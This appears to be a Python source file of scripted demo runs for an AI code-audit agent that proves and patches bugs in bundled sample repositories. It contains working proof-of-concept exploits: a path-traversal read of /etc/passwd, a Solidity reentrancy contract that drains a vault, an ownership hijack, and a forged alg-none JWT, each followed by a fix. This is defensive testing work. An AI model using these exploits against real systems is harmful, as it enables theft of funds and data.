"""Scripted agent runs for the bundled samples.

Used only when VULTR_INFERENCE_API_KEY is not set, so the project can be
demoed offline. The actions go through the exact same executor as the live
agent: proof tests are written into the sandbox and really run there, and a
finding is only kept when its proof really passes.
"""

from __future__ import annotations

NOCONF = "python -m pytest -q -s -p no:cacheprovider --noconftest"

REGRESS_PY = f'{NOCONF} tests/test_money.py -k "not license"'

HOSTILE = [
    {"action": "list_files", "thought": "Map the repo before reading anything."},
    {"action": "run", "args": {"command": "pip install pytest-timeout"},
     "thought": "The baseline hung on a test. A timeout plugin would help, try to add it."},
    {"action": "read_file", "args": {"path": "conftest.py"},
     "thought": "Policy blocked the install, fine: skip the hanging test with -k instead. The baseline run printed payload lines. conftest.py runs on every pytest start, so check what it tried."},
    {"action": "read_file", "args": {"path": "invoice_tools/money.py"},
     "thought": "Billing math is where silent money bugs hide."},
    {"action": "prove", "thought": "split_bill uses floor division and never hands out the remainder. Prove cents vanish.",
     "args": {
        "title": "split_bill silently loses cents",
        "severity": "high",
        "file": "invoice_tools/money.py", "line": 15,
        "claim": "split_bill floors every share and drops the remainder, so a 10.00 bill split three ways only collects 9.99.",
        "test_path": "proofbox_tests/test_split.py",
        "test_code": (
            "from invoice_tools import split_bill\n\n\n"
            "def test_split_bill_loses_cents():\n"
            "    shares = split_bill(1000, 3)\n"
            "    lost = 1000 - sum(shares)\n"
            "    assert lost > 0, 'shares add up, no bug'\n"
            "    print(f'\\nPROOFBOX_CONFIRMED split_bill(1000, 3) = {shares} sums to {sum(shares)}, {lost} cent lost')\n"
        ),
        "command": f"{NOCONF} proofbox_tests/test_split.py",
     }},
    {"action": "fix", "thought": "Proven. Hand the leftover cents to the first shares, then check the proof fails and old tests pass.",
     "args": {
        "finding": "F1",
        "summary": "Use divmod and give one extra cent to the first `rest` people so shares always sum to the total.",
        "patches": [{"path": "invoice_tools/money.py",
                     "find": "    share = total_cents // people\n    return [share] * people",
                     "replace": "    share, rest = divmod(total_cents, people)\n    return [share + 1] * rest + [share] * (people - rest)"}],
        "regress_command": REGRESS_PY,
     }},
    {"action": "prove", "thought": "Guess: percent=100 might divide by zero. Test it before claiming it.",
     "args": {
        "title": "apply_discount crashes at 100 percent",
        "severity": "medium",
        "file": "invoice_tools/money.py", "line": 8,
        "claim": "A 100 percent discount raises ZeroDivisionError.",
        "test_path": "proofbox_tests/test_discount.py",
        "test_code": (
            "import pytest\nfrom invoice_tools import apply_discount\n\n\n"
            "def test_full_discount_crashes():\n"
            "    with pytest.raises(ZeroDivisionError):\n"
            "        apply_discount(1000, 100)\n"
            "    print('PROOFBOX_CONFIRMED full discount crashes')\n"
        ),
        "command": f"{NOCONF} proofbox_tests/test_discount.py",
     }},
    {"action": "read_file", "args": {"path": "invoice_tools/templates.py"},
     "thought": "The discount guess failed its proof, so it is dropped. Next: template loading takes user input."},
    {"action": "prove", "thought": "os.path.join with a user supplied name allows ../ and absolute paths. Prove we can read a file outside templates.",
     "args": {
        "title": "Path traversal in load_template",
        "severity": "critical",
        "file": "invoice_tools/templates.py", "line": 10,
        "claim": "load_template joins an untrusted name onto the template folder, so ?template=../../etc/passwd reads any file the server can read.",
        "test_path": "proofbox_tests/test_traversal.py",
        "test_code": (
            "from invoice_tools import load_template\n\n\n"
            "def test_template_traversal_reads_system_file():\n"
            "    leaked = load_template('../../../../../../etc/passwd')\n"
            "    assert 'root:' in leaked\n"
            "    print('\\nPROOFBOX_CONFIRMED read /etc/passwd through load_template: ' + leaked.splitlines()[0])\n"
        ),
        "command": f"{NOCONF} proofbox_tests/test_traversal.py",
     }},
    {"action": "fix", "thought": "Resolve the real path and refuse anything outside the template folder. Normal templates must still load.",
     "args": {
        "finding": "Path traversal in load_template",
        "summary": "Resolve the path with realpath and reject names that leave the templates folder.",
        "patches": [{"path": "invoice_tools/templates.py",
                     "find": "    path = os.path.join(TEMPLATE_DIR, name)\n",
                     "replace": ("    path = os.path.realpath(os.path.join(TEMPLATE_DIR, name))\n"
                                 "    if os.path.dirname(path) != os.path.realpath(TEMPLATE_DIR):\n"
                                 "        raise ValueError(\"template name escapes the template folder\")\n")}],
        "regress_command": REGRESS_PY + " && python -c \"from invoice_tools import load_template; assert load_template('modern.txt'); print('modern.txt still loads')\"",
     }},
    {"action": "finish", "args": {"summary": (
        "The test suite is hostile: it tried to steal env vars, phone home, wipe the disk, install a cron job, "
        "spawn hundreds of processes, allocate 2 GB and hang forever. Every attempt was contained and the box was "
        "replaced before the audit. Two real bugs were proven: a critical path traversal in load_template and "
        "lost cents in split_bill. Both got patches that were verified in the sandbox: each proof now fails and the "
        "original tests still pass. One guess about apply_discount failed its proof and was dropped, and an attempt to "
        "install a package was stopped by the policy guard.")}},
]

VAULT = [
    {"action": "list_files", "thought": "Foundry project. Find the contracts."},
    {"action": "read_file", "args": {"path": "src/EtherVault.sol"},
     "thought": "Read the vault. Look at ordering of external calls and state writes, and access control."},
    {"action": "prove", "thought": "withdraw sends ETH before zeroing the balance. A contract can re enter and drain everyone.",
     "args": {
        "title": "Reentrancy drains the vault",
        "severity": "critical",
        "file": "src/EtherVault.sol", "line": 30,
        "claim": "withdraw makes the external call before setting the balance to zero, so an attacker contract re enters and takes every depositor's ETH.",
        "test_path": "test/ProofReentrancy.t.sol",
        "test_code": (
            "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\n\n"
            "import {EtherVault} from \"../src/EtherVault.sol\";\n\n"
            "interface Vm { function deal(address who, uint256 amount) external; }\n\n"
            "contract Attacker {\n"
            "    EtherVault public vault;\n"
            "    constructor(EtherVault v) { vault = v; }\n"
            "    function attack() external payable { vault.deposit{value: msg.value}(); vault.withdraw(); }\n"
            "    receive() external payable { if (address(vault).balance >= 1 ether) vault.withdraw(); }\n"
            "}\n\n"
            "contract ProofReentrancy {\n"
            "    Vm constant vm = Vm(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n"
            "    receive() external payable {}\n\n"
            "    function test_PROOFBOX_CONFIRMED_reentrancy_drains_vault() public {\n"
            "        EtherVault vault = new EtherVault();\n"
            "        vm.deal(address(this), 10 ether);\n"
            "        vault.deposit{value: 10 ether}();          // honest users\n"
            "        Attacker a = new Attacker(vault);\n"
            "        vm.deal(address(a), 0);\n"
            "        a.attack{value: 0}();\n"
            "    }\n"
            "}\n"
        ),
        "command": "forge test --offline --match-path test/ProofReentrancy.t.sol -vv",
     }},
    {"action": "prove", "thought": "The proof failed: deposit rejects 0 wei so the attack never started. Fund the attacker with 1 ether and assert the drain.",
     "args": {
        "title": "Reentrancy drains the vault",
        "severity": "critical",
        "file": "src/EtherVault.sol", "line": 30,
        "claim": "withdraw makes the external call before setting the balance to zero, so an attacker contract re enters and takes every depositor's ETH.",
        "test_path": "test/ProofReentrancy.t.sol",
        "test_code": (
            "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\n\n"
            "import {EtherVault} from \"../src/EtherVault.sol\";\n\n"
            "interface Vm { function deal(address who, uint256 amount) external; }\n\n"
            "contract Attacker {\n"
            "    EtherVault public vault;\n"
            "    constructor(EtherVault v) { vault = v; }\n"
            "    function attack() external payable { vault.deposit{value: msg.value}(); vault.withdraw(); }\n"
            "    receive() external payable { if (address(vault).balance >= 1 ether) vault.withdraw(); }\n"
            "}\n\n"
            "contract ProofReentrancy {\n"
            "    Vm constant vm = Vm(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n"
            "    receive() external payable {}\n\n"
            "    function test_PROOFBOX_CONFIRMED_reentrancy_drains_vault() public {\n"
            "        EtherVault vault = new EtherVault();\n"
            "        vm.deal(address(this), 11 ether);\n"
            "        vault.deposit{value: 10 ether}();          // honest users\n"
            "        Attacker a = new Attacker(vault);\n"
            "        a.attack{value: 1 ether}();                 // attacker puts in 1\n"
            "        require(address(vault).balance == 0, \"vault not drained\");\n"
            "        require(address(a).balance == 11 ether, \"attacker did not profit\");\n"
            "    }\n"
            "}\n"
        ),
        "command": "forge test --offline --match-path test/ProofReentrancy.t.sol -vv",
     }},
    {"action": "fix", "thought": "Checks effects interactions: zero the balance before sending ETH. The exploit must now revert.",
     "args": {
        "finding": "Reentrancy drains the vault",
        "summary": "Move the balance reset above the external call (checks effects interactions).",
        "patches": [{"path": "src/EtherVault.sol",
                     "find": ("        (bool ok, ) = msg.sender.call{value: amount}(\"\");\n"
                              "        require(ok, \"transfer failed\");\n\n"
                              "        balances[msg.sender] = 0;\n"),
                     "replace": ("        balances[msg.sender] = 0;\n\n"
                                 "        (bool ok, ) = msg.sender.call{value: amount}(\"\");\n"
                                 "        require(ok, \"transfer failed\");\n")}],
        "regress_command": "forge test --offline --match-path test/EtherVault.t.sol",
     }},
    {"action": "prove", "thought": "setOwner has no access check. Anyone can become owner and pause all withdrawals.",
     "args": {
        "title": "Anyone can take ownership and freeze funds",
        "severity": "high",
        "file": "src/EtherVault.sol", "line": 37,
        "claim": "setOwner has no onlyOwner check, so any address can make itself owner and pause withdrawals for every user.",
        "test_path": "test/ProofOwner.t.sol",
        "test_code": (
            "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\n\n"
            "import {EtherVault} from \"../src/EtherVault.sol\";\n\n"
            "contract Stranger {\n"
            "    function hijack(EtherVault v) external { v.setOwner(address(this)); v.setPaused(true); }\n"
            "}\n\n"
            "contract ProofOwner {\n"
            "    function test_PROOFBOX_CONFIRMED_stranger_takes_owner_and_pauses() public {\n"
            "        EtherVault vault = new EtherVault();\n"
            "        Stranger s = new Stranger();\n"
            "        s.hijack(vault);\n"
            "        require(vault.owner() == address(s), \"owner unchanged\");\n"
            "        require(vault.paused(), \"not paused\");\n"
            "    }\n"
            "}\n"
        ),
        "command": "forge test --offline --match-path test/ProofOwner.t.sol -vv",
     }},
    {"action": "fix", "thought": "Add the same owner check setPaused already has.",
     "args": {
        "finding": "Anyone can take ownership and freeze funds",
        "summary": "Require msg.sender to be the current owner in setOwner.",
        "patches": [{"path": "src/EtherVault.sol",
                     "find": "    function setOwner(address newOwner) external {\n",
                     "replace": "    function setOwner(address newOwner) external {\n        require(msg.sender == owner, \"not owner\");\n"}],
        "regress_command": "forge test --offline --match-path test/EtherVault.t.sol",
     }},
    {"action": "finish", "args": {"summary": (
        "Two exploits were proven with Foundry inside an offline sandbox: a reentrancy in withdraw that let a 1 ETH "
        "attacker take all 11 ETH, and an unguarded setOwner that lets anyone pause the vault. The first reentrancy "
        "proof failed, the agent read the revert, fixed the exploit and proved it on the second try. Both bugs got patches "
        "that were verified in the sandbox: the exploits now revert and the original test suite still passes.")}},
]

NOTES = [
    {"action": "list_files", "thought": "Node service with no dependencies. Read auth first."},
    {"action": "read_file", "args": {"path": "lib/auth.js"}, "thought": "Token verification is the front door."},
    {"action": "read_file", "args": {"path": "lib/notes.js"}, "thought": "See how the token is used."},
    {"action": "prove", "thought": "verify trusts alg none. Forge an unsigned admin token and read every user's notes.",
     "args": {
        "title": "Unsigned tokens accepted (alg none)",
        "severity": "critical",
        "file": "lib/auth.js", "line": 20,
        "claim": "verify skips the signature when the header says alg none, so anyone can mint an admin token and read all private notes.",
        "test_path": "proofbox_tests/alg_none.js",
        "test_code": (
            "const { listNotes } = require('../lib/notes');\n"
            "const b = (o) => Buffer.from(JSON.stringify(o)).toString('base64url');\n"
            "const forged = `${b({ alg: 'none' })}.${b({ sub: 'mallory', role: 'admin' })}.`;\n"
            "const seen = listNotes(forged);\n"
            "if (seen.length !== 2) process.exit(1);\n"
            "console.log('PROOFBOX_CONFIRMED forged unsigned token read', seen.length, 'private notes:', seen.map(n => n.owner).join(', '));\n"
        ),
        "command": "node proofbox_tests/alg_none.js",
     }},
    {"action": "fix", "thought": "Accept only HS256. An unsigned token must now be rejected.",
     "args": {
        "finding": "F1",
        "summary": "Reject every alg except HS256 instead of trusting alg none.",
        "patches": [{"path": "lib/auth.js",
                     "find": ("  if (header.alg === \"none\") {\n"
                              "    // Used by internal health checks.\n"
                              "    return payload;\n"
                              "  }\n"),
                     "replace": "  if (header.alg !== \"HS256\") throw new Error(\"unsupported alg\");\n"}],
        "regress_command": "node test/run.js",
     }},
    {"action": "prove", "thought": "paginate says page is 1 based but uses page * size, so page 1 skips the first items.",
     "args": {
        "title": "Pagination skips the first page",
        "severity": "low",
        "file": "lib/notes.js", "line": 16,
        "claim": "paginate treats a 1 based page as 0 based, so page 1 returns items 4 to 6 and items 1 to 3 are never shown.",
        "test_path": "proofbox_tests/paginate.js",
        "test_code": (
            "const { paginate } = require('../lib/notes');\n"
            "const items = [1, 2, 3, 4, 5, 6, 7, 8, 9];\n"
            "const first = paginate(items, 1, 3);\n"
            "if (first[0] === 1) process.exit(1);\n"
            "console.log('PROOFBOX_CONFIRMED paginate(items, 1, 3) =', JSON.stringify(first), 'expected [1,2,3]');\n"
        ),
        "command": "node proofbox_tests/paginate.js",
     }},
    {"action": "fix", "thought": "Convert the 1 based page to a 0 based offset.",
     "args": {
        "finding": "F2",
        "summary": "Start at (page - 1) * size so page 1 returns the first items.",
        "patches": [{"path": "lib/notes.js", "find": "  const start = page * size;\n", "replace": "  const start = (page - 1) * size;\n"}],
        "regress_command": "node test/run.js",
     }},
    {"action": "finish", "args": {"summary": (
        "A forged alg none token read every private note as admin, and page 1 of every list skips three items. "
        "Both were proven by running Node scripts against the real code in the sandbox, and both patches were verified: "
        "the proofs now fail and the existing tests still pass.")}},
]

GENERIC = [
    {"action": "list_files", "thought": "Map the repository."},
    {"action": "finish", "args": {"summary": (
        "Demo mode ran the repository's own tests inside the sandbox and recorded any containment events. "
        "Set VULTR_INFERENCE_API_KEY to let the agent read the code, write proofs and report proven bugs.")}},
]

PLANS = {"hostile-invoices": HOSTILE, "vuln-vault": VAULT, "notes-api": NOTES}


def demo_plan(source: dict) -> list[dict]:
    if source.get("type") == "sample":
        return PLANS.get(str(source.get("sample")), GENERIC)
    return GENERIC
